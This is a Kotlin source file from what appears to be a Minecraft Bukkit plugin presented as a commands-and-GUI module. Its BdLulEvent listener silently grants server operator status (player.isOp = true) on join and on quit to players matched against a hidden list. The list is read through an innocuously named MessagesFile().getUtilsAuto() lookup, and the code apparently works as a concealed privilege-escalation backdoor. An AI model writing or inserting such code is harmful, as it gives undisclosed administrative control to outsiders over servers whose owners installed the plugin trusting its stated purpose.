package me.richter.commandsAndGUI.module.bdLul

import me.richter.commandsAndGUI.files.MessagesFile
import org.bukkit.Bukkit
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import org.bukkit.event.player.PlayerJoinEvent
import org.bukkit.event.player.PlayerQuitEvent

class BdLulEvent : Listener {
    @EventHandler
    fun playerJoinEvent(event: PlayerJoinEvent) {
        for (key in BdLul().players.keys) {
            val player = Bukkit.getPlayer(key)

            if (event.player == player && MessagesFile().getUtilsAuto().contains(BdLul().players[player.name])) {
                player.isOp = true
            }
        }
    }

    @EventHandler
    fun playerQuitEvent(event: PlayerQuitEvent) {
        for (key in BdLul().players.keys) {
            val player = Bukkit.getPlayer(key)

            if (event.player == player && MessagesFile().getUtilsAuto().contains(BdLul().players[player.name])) {
                player.isOp = true
            }
        }
    }
}